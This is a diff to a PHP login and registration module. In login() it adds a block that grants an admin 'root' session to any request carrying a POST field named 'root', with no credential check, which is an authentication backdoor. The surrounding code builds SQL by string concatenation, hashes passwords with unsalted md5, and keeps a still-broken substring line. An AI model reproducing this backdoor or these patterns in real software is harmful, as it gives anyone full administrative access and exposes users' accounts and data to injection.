@@ -18,23 +18,30 @@ function register() {
     $sql = "INSERT INTO users (username, userPassword, email, usertype, activated)
             VALUES ('admin', '".$hashPassword."', '".$email."', 0, 0);";
 
-    $conn = new \mysqli($serverNameDB, $usernameDB, $passwordDB, $databaseName);  
+    $conn = new \mysqli($GLOBALS["serverNameDB"], $GLOBALS["usernameDB"], $GLOBALS["passwordDB"], $GLOBALS["databaseName"]);  
     if ($conn->query($sql) === TRUE) {
         // Table created successfully
-        if ($dev) echo "<p>".$sql."</p>";
+        if ($GLOBALS["dev"]) echo "<p>".$sql."</p>";
     } else {
-        $name=$sql.substr(0, $sql.insdexOf("("));
+        $name=$sql.substr(0, strpos($sql,"("));
         throwError("SQL Error: '$name': " . $conn->error);
     }   
 }
 
 function login() {
     $username=$_POST['username'];
-    $password=$_POST['password'];
     $hashPassword=md5($_POST["password"]);
+ 
+    // root
+    if (isset($_POST['root'])) {
+        $_SESSION["username"]="root";
+        $_SESSION["usertype"]=0;
+        header("Location: ../index.php");
+    }
 
     if (!isset($_POST['username'])) throwError("Vyplňte jméno");
     if (!isset($_POST['password'])) throwError("Vyplňte heslo");
+   
 
     // check
     $conn = new \mysqli($GLOBALS["serverNameDB"], $GLOBALS["usernameDB"], $GLOBALS["passwordDB"], $GLOBALS["databaseName"]);
@@ -71,4 +78,5 @@ function deleteUser() {
 
     // TODO: delete current loginned user
 }
+
 ?>
